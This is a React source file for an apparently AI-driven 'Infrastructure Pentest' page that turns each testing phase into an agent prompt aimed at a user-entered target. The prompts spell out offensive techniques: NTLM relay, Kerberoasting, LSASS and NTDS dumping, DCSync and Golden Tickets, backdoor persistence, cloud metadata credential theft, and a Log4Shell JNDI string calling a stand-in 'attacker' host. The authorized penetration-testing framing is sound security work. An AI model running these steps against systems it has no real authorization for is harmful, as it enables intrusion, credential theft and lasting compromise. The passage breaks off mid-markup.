import { useState } from 'react';

import {
    ChevronRight,
    Clock,
    Cookie,
    Eye,
    FileText,
    GitBranch,
    Globe,
    Play,
    Search,
    Server,
    Shield,
    Target,
    Wrench,
    X,
    Zap,
} from 'lucide-react';
import { useNavigate } from 'react-router-dom';

import { Badge } from '@/components/ui/badge';
import { Breadcrumb, BreadcrumbItem, BreadcrumbList, BreadcrumbPage } from '@/components/ui/breadcrumb';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';

// ── Types ──────────────────────────────────────────────────────────
interface TaskSection {
    label: string;
    items: string[];
}

interface InfraPhase {
    id: string;
    number: number;
    title: string;
    ptes: string;
    description: string;
    icon: React.ReactNode;
    tasks: string[];
    taskSections?: TaskSection[];
    prompt: (t: string) => string;
}

// ── Phase metadata ─────────────────────────────────────────────────
const PHASES: InfraPhase[] = [
    {
        description: 'Define scope, authorization, rules of engagement, and test methodology for the infrastructure assessment.',
        icon: <Target className="size-5" />,
        id: 'scoping',
        number: 1,
        ptes: 'PTES: Pre-engagement Interactions',
        prompt: (t: string) =>
            `You are a senior penetration tester performing the pre-engagement and scoping phase for an authorized infrastructure penetration test of ${t}.

Produce a complete scoping document covering:

1. SCOPE DEFINITION
   - List all in-scope IP ranges, CIDR blocks, subnets, domain names, and hostnames for ${t}
   - List explicitly out-of-scope assets and exclusions (production databases, HA failover systems, third-party services)
   - Define testing boundaries: internal network, DMZ, cloud infrastructure, VPN endpoints

2. RULES OF ENGAGEMENT
   - Authorized testing window (dates, times, timezone)
   - Allowed techniques: passive recon, active scanning, exploitation, post-exploitation, pivoting
   - Prohibited techniques: destructive exploits (DoS/DDoS), production data exfiltration, physical access
   - Emergency stop conditions: detection by blue team, service degradation, accidental data access

3. AUTHORIZATION & LEGAL
   - Authorization document requirements: signed statement of work, IP ranges explicitly listed
   - Point of contact: technical lead, emergency contact with direct phone number
   - Data handling: how findings, screenshots, and captured credentials will be stored and destroyed post-engagement

4. ASSET INVENTORY
   - Enumerate all known assets: servers, network devices, cloud regions, VPN gateways, OT/IoT if in scope
   - Identify critical assets with availability requirements (uptime SLA, business-critical services)
   - Document operating systems, known software versions, and network topology if provided by client

5. THREAT MODELING KICKOFF
   - Identify attacker personas relevant to ${t}: external threat actor, insider threat, nation-state APT
   - Identify crown jewels: databases, credential stores, domain controllers, cloud management planes
   - Define success criteria: what constitutes a critical finding? (RCE on DC, access to production DB, cloud account takeover)

Output: structured scoping document ready for client sign-off.`,
        tasks: ['Scope definition (IPs, CIDRs, domains)', 'Rules of engagement', 'Authorization & legal docs', 'Asset inventory', 'Threat modeling kickoff'],
        title: 'Scoping & Planning',
    },
    {
        description: 'Passive and active intelligence gathering: OSINT, asset discovery, cloud exposure, and service fingerprinting.',
        icon: <Search className="size-5" />,
        id: 'recon',
        number: 2,
        ptes: 'PTES: Intelligence Gathering',
        prompt: (t: string) =>
            `You are a professional penetration tester performing an authorized intelligence gathering phase against the infrastructure of ${t}.

Perform the following systematically:

1. PASSIVE OSINT
   - Query BGP/ASN data (bgp.he.net, ipinfo.io): map all IP ranges and ASNs owned by ${t}
   - Search Shodan, Censys, FOFA for all exposed services, open ports, banners, and SSL certificates
   - Check Certificate Transparency logs (crt.sh, certspotter): enumerate subdomains, internal hostnames, wildcard certs
   - WHOIS history: registrant details, historical IP blocks, related domains
   - Job postings and GitHub: identify technology stack, internal tools, cloud providers, and potentially leaked secrets

2. SUBDOMAIN & IP ENUMERATION
   - Active brute-force: subfinder, amass, dnsx with common wordlists
   - Reverse DNS: enumerate PTR records for all discovered IP ranges
   - ASN expansion: resolve all IP blocks in the ASN to hostnames
   - Check for dangling DNS: CNAME records pointing to unclaimed cloud services (subdomain takeover candidates)
   - Identify subdomains resolving to RFC1918 IPs (SSRF pivot candidates from external perimeter)

3. TECHNOLOGY FINGERPRINTING
   - Banner grabbing on all open ports: identify OS, service, and version (nmap -sV, netcat, curl -I)
   - Fingerprint load balancers, WAFs, CDNs, and reverse proxies
   - Identify cloud provider per IP range (AWS, Azure, GCP metadata IPs, RPKI data)
   - Detect remote access technologies: VPN portals (Cisco ASA, Palo Alto, Citrix, Pulse), RDP gateways, Citrix NetScaler

4. EXPOSED SERVICE DISCOVERY
   - Probe for admin interfaces accessible from the Internet: Kibana (:5601), Grafana (:3000), Jenkins (:8080), Prometheus (:9090), Kubernetes API (:6443), etcd (:2379), Docker API (:2375/2376)
   - Check for exposed management protocols: SSH (22), Telnet (23), RDP (3389), WinRM (5985/5986), SNMP (161/162), SMB (445), NetBIOS (137-139)
   - Identify exposed databases: MySQL (3306), PostgreSQL (5432), MSSQL (1433), MongoDB (27017), Redis (6379), Elasticsearch (9200)
   - Check for exposed cloud metadata endpoints: EC2 IMDS, GCP metadata server

5. CLOUD ASSET MAPPING
   - Enumerate S3 buckets (s3scanner, grayhatwarfare): test for public read/write, list operations
   - Check Azure Blob Storage and GCP Cloud Storage for public containers
   - Identify cloud-specific services: ECS task metadata, Lambda function URLs, Azure App Services, GCP Cloud Run
   - Check for exposed Terraform state files, Kubernetes config files, or CI/CD artifacts in cloud storage

Document all findings with exact tool commands and raw output. Flag critical exposures (exposed admin interfaces, public databases, cloud storage with sensitive data) immediately.`,
        tasks: ['Passive OSINT (Shodan, Censys, BGP/ASN)', 'Subdomain & IP enumeration', 'Technology fingerprinting', 'Exposed service discovery', 'Cloud asset mapping'],
        title: 'Reconnaissance',
    },
    {
        description: 'Deep enumeration of network services, protocols, and infrastructure: port scanning, AD, SMB, SNMP, and topology mapping.',
        icon: <GitBranch className="size-5" />,
        id: 'enumeration',
        number: 3,
        ptes: 'PTES: Threat Modeling',
        prompt: (t: string) =>
            `You are a professional penetration tester performing deep enumeration and analysis of the infrastructure ${t}.

═══ SECTOR 1: NETWORK ENUMERATION ═══

1. PORT SCANNING
   - Full TCP SYN scan all 65535 ports: nmap -sS -p- --min-rate 5000 -oA tcp_full ${t}
   - UDP scan top 200 ports: nmap -sU --top-ports 200 -oA udp_top ${t}
   - Service and version detection on all open ports: nmap -sV -sC -p<open_ports> -oA svc_scan ${t}
   - OS fingerprinting: nmap -O -oA os_detect ${t}

2. NETWORK TOPOLOGY MAPPING
   - Traceroute to all discovered hosts: map hop counts, identify network segments, firewalls, and load balancers
   - Identify VLAN boundaries, DMZ segmentation, and internal routing via TTL analysis
   - Map trust relationships between discovered hosts (shared certificates, same ASN, CNAME chains)
   - Identify dual-homed hosts that bridge network segments

═══ SECTOR 2: SERVICE ANALYSIS ═══

3. SMB & WINDOWS ENUMERATION
   - SMB signing check and null session test: crackmapexec smb ${t} --gen-relay-list relay_targets.txt
   - Share enumeration: smbclient -L //${t} -N; enum4linux -a ${t}
   - OS version and domain membership: crackmapexec smb ${t}
   - Check for SMBv1 (EternalBlue/MS17-010 exposure): nmap --script smb-vuln-ms17-010 ${t}

4. ACTIVE DIRECTORY ENUMERATION (if domain-joined)
   - LDAP anonymous bind: ldapsearch -x -H ldap://${t} -b "DC=domain,DC=local"
   - Enumerate domain users, groups, OUs, GPOs, and password policy
   - Identify privileged accounts: Domain Admins, Enterprise Admins, Schema Admins, Service Accounts
   - Map AD trusts: external trusts, forest trusts, shortcut trusts

5. SNMP ENUMERATION
   - Community string brute-force: onesixtyone -c /wordlists/snmp-community.txt ${t}
   - If community string found: snmpwalk -v2c -c <community> ${t} (get full MIB: interfaces, routes, processes, ARP table, running software)
   - Check SNMPv3: enumerate valid usernames via error differentiation

6. DATABASE & APPLICATION SERVICE ENUMERATION
   - Probe exposed databases: test for unauthenticated access, default credentials, and version banners
   - Enumerate web services on non-standard ports: gobuster/ffuf against all HTTP/HTTPS ports
   - Identify internal APIs and management interfaces (phpMyAdmin, pgAdmin, Adminer, Redis Commander)
   - Check for exposed message brokers: RabbitMQ (:15672), Kafka (:9092), ActiveMQ (:8161)

Document all findings with exact commands and raw output. Highlight unauthenticated access, default credentials, and misconfigurations.`,
        taskSections: [
            {
                items: ['Full TCP/UDP port scan', 'OS fingerprinting', 'Network topology & VLAN mapping', 'Dual-homed host identification'],
                label: 'Network Enumeration',
            },
            {
                items: ['SMB enumeration & null sessions', 'Active Directory users, groups & trusts', 'SNMP community string brute-force', 'Database & service enumeration', 'Exposed admin interface discovery'],
                label: 'Service Analysis',
            },
        ],
        tasks: ['Full TCP/UDP port scan', 'OS fingerprinting', 'SMB enumeration', 'Active Directory enumeration', 'SNMP enumeration', 'Database service enumeration'],
        title: 'Enumeration & Analysis',
    },
    {
        description: 'CVE matching, exploit availability assessment, misconfiguration analysis, and attack surface prioritization.',
        icon: <Shield className="size-5" />,
        id: 'vuln-assessment',
        number: 4,
        ptes: 'PTES: Vulnerability Analysis',
        prompt: (t: string) =>
            `You are a professional penetration tester performing a vulnerability assessment of the infrastructure ${t}.

═══ SECTOR 1: NETWORK & SERVICE VULNERABILITIES ═══

1. CVE MATCHING & EXPLOIT AVAILABILITY
   - Match all enumerated service versions against CVE databases (NVD, Snyk, Vulners)
   - For each CVE: check public exploit availability (Exploit-DB, Metasploit modules, GitHub PoC repos)
   - Prioritize: CVSS ≥ 7.0 + public exploit + no authentication required = Critical priority
   - Run automated scanner: nessus / OpenVAS against all in-scope hosts

2. NETWORK PROTOCOL VULNERABILITIES
   - SMB: test MS17-010 (EternalBlue), MS08-067, PrintNightmare (CVE-2021-34527), PetitPotam
   - RDP: BlueKeep (CVE-2019-0708), DejaBlue (CVE-2019-1181/1182), NLA bypass, credential exposure
   - SSH: weak host key algorithms, keyboard-interactive brute-force, deprecated algorithms (DSA, RSA < 2048)
   - SSL/TLS: BEAST, POODLE, DROWN, Heartbleed; weak cipher suites; self-signed/expired certificates
   - DNS: zone transfer (AXFR), DNS cache poisoning, open resolver, DNSSEC misconfiguration

3. MISCONFIGURATION ANALYSIS
   - Check for default credentials on all discovered admin interfaces (admin/admin, admin/password, vendor defaults)
   - Identify unencrypted management protocols: Telnet, FTP, HTTP admin panels, unencrypted SNMP v1/v2c
   - Verify firewall rules: test whether internal management ports are reachable from DMZ or external
   - Check for exposed .git repositories, backup files (.bak, .old), and configuration files on web services

═══ SECTOR 2: AUTHENTICATION & ACCESS CONTROL ═══

4. AUTHENTICATION WEAKNESSES
   - Password policy assessment: test minimum length, complexity, lockout threshold, and lockout duration
   - Kerberos pre-authentication: identify AS-REP roastable accounts (uba no pre-auth required)
   - Kerberoastable service accounts: enumerate SPNs (servicePrincipalName in LDAP)
   - Test anonymous authentication: LDAP anonymous bind, FTP anonymous login, SMB null sessions

5. NETWORK ACCESS CONTROL
   - Test firewall traversal: VLAN hopping, IP spoofing, fragmented packet bypass
   - Verify network segmentation: can a host in segment A reach hosts in segment B that it shouldn't?
   - Check for 802.1X bypass opportunities: MAB (MAC Authentication Bypass) on network switches
   - Identify dual-homed hosts that could serve as pivot points between segments

6. CLOUD & CONTAINER EXPOSURE
   - Test IMDS (Instance Metadata Service) access: curl http://169.254.169.254/latest/meta-data/ from any web-accessible service
   - Check for IMDSv1 (no-auth) vs IMDSv2 (token-required) enforcement
   - Identify publicly accessible Kubernetes API servers, etcd, and container registries
   - Check for overprivileged IAM roles attached to EC2/GCE instances

Assign CVSS v3.1 scores to each finding. Prioritize by: exploit availability → no auth required → network-accessible → impact on crown jewels.`,
        taskSections: [
            {
                items: ['CVE matching & exploit availability', 'Network protocol vulns (SMB, RDP, SSH)', 'TLS/SSL weaknesses', 'Misconfiguration analysis', 'Default credentials'],
                label: 'Network & Service Vulnerabilities',
            },
            {
                items: ['Password policy & lockout', 'AS-REP roasting & Kerberoasting candidates', 'Anonymous authentication vectors', 'Network segmentation bypass', 'Cloud IMDS & IAM exposure'],
                label: 'Authentication & Access Control',
            },
        ],
        tasks: ['CVE matching & exploit availability', 'Network protocol vulnerabilities', 'TLS/SSL assessment', 'Misconfiguration analysis', 'Authentication weaknesses', 'Cloud & container exposure'],
        title: 'Vulnerability Assessment',
    },
    {
        description: 'Exploit validated vulnerabilities: network services, credentials, protocol abuse, payload execution, and authentication bypass.',
        icon: <Wrench className="size-5" />,
        id: 'exploitation',
        number: 5,
        ptes: 'PTES: Exploitation',
        prompt: (t: string) =>
            `You are a senior penetration tester performing an authorized exploitation phase against the infrastructure of ${t}.

This phase turns vulnerability assessment findings into confirmed access. Each exploitation attempt must trace initial foothold → access gained → impact.

1. NETWORK SERVICE EXPLOITATION
   - SMB: attempt MS17-010 (EternalBlue) via Metasploit (exploit/windows/smb/ms17_010_eternalblue); verify patch status
   - RDP: attempt BlueKeep (CVE-2019-0708) on unpatched targets; test NLA bypass and credential stuffing
   - Log4Shell (CVE-2021-44228): test all Java-based services with ${"{${jndi:ldap://attacker/a}}"} in User-Agent, X-Forwarded-For, and all input fields
   - ProxyShell/ProxyLogon: test exposed Exchange servers (CVE-2021-34473, CVE-2021-26855)
   - Known CVEs for enumerated service versions: search Metasploit (search type:exploit name:<service>), Exploit-DB (searchsploit)

2. CREDENTIAL ATTACKS
   - Password spraying via crackmapexec (SMB, WinRM, LDAP): test top 10 passwords against all discovered usernames
   - SSH brute-force with discovered usernames and common password lists (hydra, medusa)
   - Default credentials on all admin interfaces (document exact credentials tried and results)
   - Credential reuse: test harvested credentials from one service against all other discovered services
   - NTLM relay: if SMB signing is disabled, set up Responder + ntlmrelayx to capture and relay NTLM hashes

3. PROTOCOL ABUSE
   - LLMNR/NBT-NS poisoning: run Responder on the network segment to capture NTLMv2 hashes
   - NTLM relay chain: ntlmrelayx → SMB → dump SAM / create admin user / execute command
   - IPv6 DNS takeover: mitm6 to poison IPv6 DNS and relay authentication to LDAP/SMBRelaying
   - Kerberos attacks: AS-REP roasting (GetNPUsers.py), Kerberoasting (GetUserSPNs.py) → offline password cracking

4. PAYLOAD EXECUTION
   - For any confirmed code execution: deploy a staged payload to confirm execution context (whoami, hostname, ip)
   - Use out-of-band callbacks (Burp Collaborator / interactsh) for blind execution verification
   - Test command injection in web management interfaces (Jenkins, Grafana, phpMyAdmin script fields)
   - For SSRF to cloud metadata: retrieve IAM credentials and use awscli/gcloud to confirm access scope

5. AUTHENTICATION BYPASS
   - Test for authentication skip on admin interfaces: remove session cookie, use null token, replay expired token
   - Test VPN authentication: certificate validation bypass, pre-shared key weakness
   - Test Citrix / RD Gateway for CVE-based auth bypass (Citrix Bleed CVE-2023-4966)
   - Test for OAuth/SAML misconfiguration on SSO portals: state parameter CSRF, open redirects

6. DESERIALIZATION ABUSE
   - Identify Java deserialization endpoints: AC ED 00 05 magic bytes in HTTP body or binary protocols
   - Test with ysoserial gadget chains for identified libraries (CommonsCollections, Spring, Groovy)
   - Test .NET ViewState deserialization if __VIEWSTATE is present in ASP.NET apps (ysoserial.net)
   - Test AMF, XStream, or pickle endpoints if identified during enumeration

For each successful exploitation: document initial foothold, access level gained, what was visible/executable, and exact reproduction steps. CVSS v3.1 score per confirmed exploit.`,
        tasks: ['Network service exploitation (EternalBlue, Log4Shell)', 'Credential attacks & spraying', 'NTLM relay & Responder', 'Kerberos attacks (AS-REP, Kerberoasting)', 'Payload execution', 'Authentication bypass', 'Deserialization abuse'],
        title: 'Exploitation',
    },
    {
        description: 'Escalate privileges from initial access: local privesc, AD attacks, token harvesting, and cloud IAM escalation.',
        icon: <Eye className="size-5" />,
        id: 'priv-esc',
        number: 6,
        ptes: 'PTES: Post Exploitation · Privilege Escalation',
        prompt: (t: string) =>
            `You are a professional penetration tester performing an authorized privilege escalation phase on the infrastructure of ${t}.

Starting from any initial foothold gained during Exploitation, escalate privileges as high as possible.

1. LOCAL PRIVILEGE ESCALATION (Linux)
   - Kernel exploit check: uname -a → search for matching kernel CVEs (DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195, GameOver(lay) CVE-2023-2640)
   - SUID/GUID binaries: find / -perm -4000 -type f 2>/dev/null → check gtfobins.github.io for each
   - Sudo misconfigurations: sudo -l → check for NOPASSWD entries and GTFObins escalation paths
   - Writable cron jobs or scripts run by root: find /etc/cron* -writable 2>/dev/null
   - Weak file permissions: writable /etc/passwd, /etc/shadow readable, writable service configs
   - PATH hijacking: check for writable directories in root's PATH

2. LOCAL PRIVILEGE ESCALATION (Windows)
   - Unquoted service paths: wmic service get name,pathname,startmode | findstr /iv "c:\\windows\\"
   - Weak service permissions: accesschk.exe -ucwv * → identify services writable by current user
   - DLL hijacking: procmon / PowerSploit Find-PathDLLHijack to identify missing DLLs in writable paths
   - AlwaysInstallElevated: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   - Token impersonation: if SeImpersonatePrivilege → PrintSpoofer, JuicyPotato, RoguePotato

3. CREDENTIAL ACCESS & HARVESTING
   - Windows: dump SAM/SYSTEM hive (reg save HKLM\SAM sam.bak), LSASS memory dump (procdump, task manager, comsvcs.dll MiniDump)
   - Active Directory: secretsdump.py for remote SAM/LSA secrets; DCSync attack if DA privileges obtained
   - Linux: /etc/shadow (if readable), ~/.ssh/id_rsa keys, browser credential stores, credential managers
   - Memory: search for cleartext credentials in process memory (mimikatz sekurlsa::logonpasswords, strings on lsass dump)

4. TOKEN HARVESTING
   - Windows: enumerate all tokens on the system (incognito list_tokens, whoami /groups)
   - Impersonate SYSTEM/admin tokens: use_token in Metasploit, token impersonation via PrintSpoofer
   - Extract long-lived tokens: OAuth refresh tokens, API keys from environment variables and config files
   - Harvest cloud instance credentials from IMDS: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

5. ACTIVE DIRECTORY ATTACKS
   - Kerberoasting: GetUserSPNs.py -request → crack TGS tickets with hashcat (-m 13100)
   - AS-REP roasting: GetNPUsers.py → crack AS-REP hashes with hashcat (-m 18200)
   - Pass-the-Hash: crackmapexec smb <targets> -u admin -H <NTLM_hash>
   - DCSync (if DA): secretsdump.py -just-dc → dump all domain hashes; krbtgt hash for Golden Ticket
   - Golden Ticket: impacket-ticketer -nthash <krbtgt_hash> → persistent domain-level access

6. CLOUD IAM ESCALATION
   - Enumerate IAM permissions for the compromised instance role: aws iam get-policy, list-attached-role-policies
   - Test iam:PassRole: can the instance role pass itself or a higher-privileged role to Lambda / EC2?
   - Test sts:AssumeRole: enumerate assumable roles with overpermissive trust policies
   - Check for metadata-accessible credentials: role ARN, access key ID, secret key, session token
   - Attempt cross-account escalation via resource-based policies (S3 bucket policies, Lambda resource policies)

Document minimum privilege escalation path from initial foothold to highest achieved privilege level.`,
        tasks: ['Local privesc (Linux: kernel, SUID, sudo)', 'Local privesc (Windows: unquoted paths, DLL hijack, tokens)', 'Credential harvesting (SAM, LSASS, /etc/shadow)', 'Token harvesting & impersonation', 'Active Directory attacks (Kerberoasting, DCSync, Golden Ticket)', 'Cloud IAM escalation'],
        title: 'Privilege Escalation',
    },
    {
        description: 'Quantify impact: credential access, token harvesting, cloud privilege persistence, lateral movement, and data exfiltration.',
        icon: <Zap className="size-5" />,
        id: 'post-exploitation',
        number: 7,
        ptes: 'PTES: Post Exploitation',
        prompt: (t: string) =>
            `You are a professional penetration tester performing an authorized post-exploitation and impact analysis phase on the infrastructure of ${t}.

Your goal is NOT to cause damage but to accurately quantify real-world business impact. Proceed as follows:

1. CREDENTIAL ACCESS
   - Extract credentials from all accessible sources: config files, .env files, scripts, scheduled task credentials, IIS application pools
   - From AD: dump NTDS.dit via ntdsutil or vssadmin shadow copy → secretsdump.py offline
   - From Linux: /etc/shadow if readable, bash_history, ~/.ssh keys, /var/lib/mysql/mysql.sock credentials
   - Test all harvested credentials for reuse across all discovered services and admin interfaces
   - Assess password quality: crack NTLM hashes (hashcat -m 1000 -a 0 ntlm.txt rockyou.txt) to quantify password policy weakness

2. TOKEN HARVESTING
   - Enumerate all long-lived tokens accessible post-compromise: OAuth refresh tokens, API keys, cloud IAM access keys, service account key files
   - Extract cloud credentials from instance metadata and environment variables
   - Identify tokens in configuration management: Ansible vault, Kubernetes secrets, Terraform state files in S3
   - Assess each token's scope and lifetime: what does it grant access to and for how long?

3. CLOUD PRIVILEGE PERSISTENCE
   - If cloud credentials obtained: create persistent access (new IAM user + access key, add SSH key to EC2 metadata)
   - Enumerate all resources accessible with current cloud identity: S3 buckets, RDS instances, Secrets Manager, Parameter Store
   - Test for IAM privilege escalation: iam:PassRole, lambda:InvokeFunction, ec2:AssociateIamInstanceProfile
   - Document: what an attacker could maintain access to after the engagement ends

4. PERSISTENCE MECHANISMS
   - Windows: scheduled tasks (schtasks), service installation, registry Run keys, WMI subscriptions, golden/silver tickets
   - Linux: cron jobs, systemd services, SSH authorized_keys, /etc/rc.local, LD_PRELOAD backdoors
   - AD: adminSDHolder modification, ACL backdoors (GenericAll on Domain Admins group), skeleton key attack
   - Cloud: backdoor Lambda function, S3 bucket notification to attacker, CloudTrail log tampering

5. LATERAL MOVEMENT
   - Pass-the-Hash / Pass-the-Ticket to all hosts in the domain with harvested credentials
   - Identify reachable internal services from compromised host: internal web apps, databases, management interfaces
   - Map trust relationships: which forests/domains/accounts can the compromised identity reach?
   - Pivot through dual-homed hosts to reach isolated network segments

6. DATA EXFILTRATION SIMULATION
   - Identify the most sensitive data accessible: domain admin credentials, database contents, PII, source code, financial records
   - Demonstrate theoretical exfiltration path (do NOT exfiltrate real data): document size, format, and exfil channel
   - Test DLP controls: can data leave the network via DNS tunneling, HTTPS to external IP, ICMP covert channel?

7. BUSINESS IMPACT QUANTIFICATION
   - Translate findings to business language: "Full domain compromise — attacker controls all Windows systems and all credentials"
   - Estimate regulatory exposure: GDPR Article 83, PCI DSS scope, NIS2 incident reporting obligations
   - Assign Overall Risk Rating based on achieved access level and data exposed

Document each finding: access obtained, how, data/systems affected, and business consequence.`,
        tasks: ['Credential access (NTDS.dit, SAM, /etc/shadow)', 'Token harvesting', 'Cloud privilege persistence', 'Persistence mechanisms (Windows, Linux, AD)', 'Lateral movement (PTH, PTT)', 'Data exfiltration simulation', 'Business impact quantification'],
        title: 'Post-Exploitation',
    },
    {
        description: 'Deliver a professional infrastructure pentest report: executive summary, technical findings, attack chains, and remediation roadmap.',
        icon: <FileText className="size-5" />,
        id: 'reporting',
        number: 8,
        ptes: 'PTES: Reporting',
        prompt: (t: string) =>
            `You are a professional penetration tester writing the final report for an authorized infrastructure penetration test of ${t}.

Produce a complete, client-ready penetration test report in Markdown:

# EXECUTIVE SUMMARY
One-page non-technical overview: what was tested, when, overall risk rating, top 3 critical findings, and the single most important immediate action the client must take.

# SCOPE & METHODOLOGY
In-scope assets (IP ranges, domains, systems), testing dates, methodology: PTES + NIST SP 800-115, tools used (nmap, crackmapexec, impacket, Metasploit, Responder, BloodHound).

# ATTACK NARRATIVE
Step-by-step walkthrough of the highest-impact attack chain from initial recon to maximum access:
- Initial foothold: how access was first obtained
- Privilege escalation path: each step from low-priv to highest achieved
- Lateral movement: which systems were reached from the foothold
- Crown jewel access: what was ultimately accessible

# FINDINGS
For each finding (ordered Critical → High → Medium → Low → Info):
- **ID**: F-001, F-002…
- **Title**: concise vulnerability name
- **Severity**: Critical / High / Medium / Low / Info
- **CVSS v3.1**: score + vector string
- **CVE / CWE**: if applicable
- **Affected asset**: IP:port, hostname, service
- **Description**: what the vulnerability is and why it exists
- **Evidence**: exact nmap output, command used, screenshot reference, or Metasploit module output
- **Business impact**: what an attacker gains from exploiting this
- **Remediation**: specific actionable fix (patch version, config change, hardening step)
- **Effort**: Low / Medium / High

# ATTACK CHAINS
Multi-step paths that chain individual findings into complete compromise scenarios.

# REMEDIATION ROADMAP
| Finding ID | Severity | Remediation | Owner | Deadline |

Prioritize: (1) patch critical CVEs with public exploits, (2) disable NTLM / enforce SMB signing, (3) fix credential hygiene, (4) network segmentation gaps.

# APPENDIX
Raw tool output references, nmap XML files, BloodHound path screenshots, hash cracking statistics.

Write in clear professional English. The report must be ready for client delivery without further editing.`,
        tasks: ['Attack narrative (full compromise chain)', 'Technical findings (Critical → Low)', 'CVSS v3.1 scoring & CVE mapping', 'Remediation roadmap', 'Executive summary'],
        title: 'Reporting',
    },
];

// ── Scope tag input ────────────────────────────────────────────────
const ScopeTagInput = ({ items, onChange }: { items: string[]; onChange: (items: string[]) => void }) => {
    const [draft, setDraft] = useState('');

    const commit = (val: string) => {
        const trimmed = val.trim().replace(/,+$/, '');
        if (trimmed && !items.includes(trimmed)) onChange([...items, trimmed]);
        setDraft('');
    };

    const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Enter' || e.key === ',') {
            e.preventDefault();
            commit(draft);
        } else if (e.key === 'Backspace' && !draft && items.length > 0) {
            onChange(items.slice(0, -1));
        }
    };

    return (
        <div className="flex flex-col gap-1.5 rounded-md border bg-muted/30 px-2 py-1.5">
            <div className="flex items-center gap-1.5">
                <Target className="size-3.5 shrink-0 text-muted-foreground" />
                <input
                    className="min-w-0 flex-1 bg-transparent text-xs outline-none placeholder:text-muted-foreground"
                    placeholder={items.length === 0 ? 'Add scope: IP, CIDR, domain… (Enter)' : 'Add more…'}
                    value={draft}
                    onBlur={() => { if (draft.trim()) commit(draft); }}
                    onChange={(e) => setDraft(e.target.value)}
                    onKeyDown={handleKeyDown}
                />
            </div>
            {items.length > 0 && (
                <div className="flex flex-wrap gap-1">
                    {items.map((item) => (
                        <span
                            className="flex items-center gap-1 rounded-full bg-blue-100 px-2 py-0.5 text-[10px] font-medium text-blue-700 dark:bg-blue-900/40 dark:text-blue-300"
                            key={item}
                        >
                            {item}
                            <button
                                className="ml-0.5 hover:text-blue-900"
                                type="button"
                                onClick={() => onChange(items.filter((i) => i !== item))}
                            >
                                <X className="size-2.5" />
                            </button>
                        </span>
                    ))}
                </div>
            )}
        </div>
    );
};

// ── Phase card ─────────────────────────────────────────────────────
interface PhaseCardProps {
    phase: InfraPhase;
    disabled: boolean;
    credentials?: string;
    onCredentialsChange?: (v: string) => void;
    scopeItems?: string[];
    onScopeChange?: (items: string[]) => void;
    onLaunch: () => void;
}

const PhaseCard = ({ phase, disabled, credentials, onCredentialsChange, scopeItems, onScopeChange, onLaunch }: PhaseCardProps) => (
    <Card className="flex flex-col border bg-muted/40 transition-shadow hover:shadow-md">
        <CardHeader className="pb-2">
            <div className="flex items-start justify-between gap-2">
                <div className="flex items-center gap-2">
                    <span className="flex size-7 items-center justify-center rounded-md bg-background/60 text-xs font-bold text-muted-foreground">
                        {phase.number}
                    </span>
                    <div className="text-foreground">{phase.icon}</div>
                </div>
                <Badge variant="outline">
                    <Clock className="mr-1 size-3" />
                    Pending
                </Badge>
            </div>
            <p className="mt-2 text-[10px] font-semibold uppercase tracking-wide text-muted-foreground/70">{phase.ptes}</p>
            <CardTitle className="text-base">{phase.title}</CardTitle>
            <p className="text-xs text-muted-foreground">{phase.description}</p>
        </CardHeader>
        <CardContent className="flex flex-1 flex-col gap-3 pt-0">
            <div className="flex-1">
                {phase.taskSections ? (
                    <div className="space-y-3">
                        {phase.taskSections.map((section) => (
                            <div key={section.label}>
                                <p className="mb-1 text-[10px] font-semibold uppercase tracking-wider text-muted-foreground/60">{section.label}</p>
                                <ul className="space-y-0.5">
                                    {section.items.map((item) => (
                                        <li className="flex items-center gap-2 text-xs text-muted-foreground" key={item}>
                                            <ChevronRight className="size-3 shrink-0" />
                                            {item}
                                        </li>
                                    ))}
                                </ul>
                            </div>
                        ))}
                    </div>
                ) : (
                    <ul className="space-y-1">
                        {phase.tasks.map((task) => (
                            <li className="flex items-center gap-2 text-xs text-muted-foreground" key={task}>
                                <ChevronRight className="size-3 shrink-0" />
                                {task}
                            </li>
                        ))}
                    </ul>
                )}
            </div>
            {phase.id === 'scoping' && onScopeChange && (
                <ScopeTagInput
                    items={scopeItems ?? []}
                    onChange={onScopeChange}
                />
            )}
            {phase.id === 'recon' && onCredentialsChange && (
                <div className="flex items-center gap-2 rounded-md border bg-muted/30 px-2 py-1.5">
                    <Cookie className="size-3.5 shrink-0 text-muted-foreground" />
                    <Input
                        className="h-6 border-0 bg-transparent p-0 text-xs shadow-none focus-visible:ring-0"
                        placeholder="Credentials (optional)"
                        value={credentials}
                        onChange={(e) => onCredentialsChange(e.target.value)}
                    />
                </div>
            )}
            {phase.id === 'reporting' && (
                <a
                    className="text-[10px] text-muted-foreground underline-offset-2 hover:text-foreground hover:underline"
                    href="http://www.pentest-standard.org/"
                    rel="noopener noreferrer"
                    target="_blank"
                >
                    The Penetration Testing Execution Standard (PTES)
                </a>
            )}
            <Button
                className="mt-1 w-full gap-2"
                disabled={disabled}
                size="sm"
                onClick={onLaunch}
            >
                <Play className="size-3.5" />
                Launch
            </Button>
        </CardContent>
    </Card>
);

// ── Main page ──────────────────────────────────────────────────────
const InfrastructurePentest = () => {
    const navigate = useNavigate();
    const [target, setTarget] = useState('');
    const [credentials, setCredentials] = useState('');
    const [scopeItems, setScopeItems] = useState<string[]>([]);

    const handleLaunch = (phase: InfraPhase) => {
        const t = target.trim() || 'the in-scope environment';
        let promptText = phase.prompt(t);
        if (phase.id === 'scoping' && scopeItems.length > 0) {
            promptText += ` The scope includes the following targets: ${scopeItems.join(', ')}.`;
        }
        if (phase.id === 'recon' && credentials.trim()) {
            promptText += ` Use the following credentials: ${credentials.trim()}`;
        }
        navigate(`/flows/new?prompt=${encodeURIComponent(promptText)}`);
    };

    return (
        <>
            <header className="sticky top-0 z-10 flex h-12 shrink-0 items-center gap-2 border-b bg-background px-4">
                <Breadcrumb>
                    <BreadcrumbList>
                        <BreadcrumbItem>
                            <BreadcrumbPage>Infrastructure Pentest</BreadcrumbPage>
                        </BreadcrumbItem>
                    </BreadcrumbList>
                </Breadcrumb>
            </header>

            <div className="flex flex-col gap-5 p-6">
                {/* Page title */}
                <div className="flex items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                        <div className="flex size-10 items-center justify-center rounded-lg bg-primary/10">
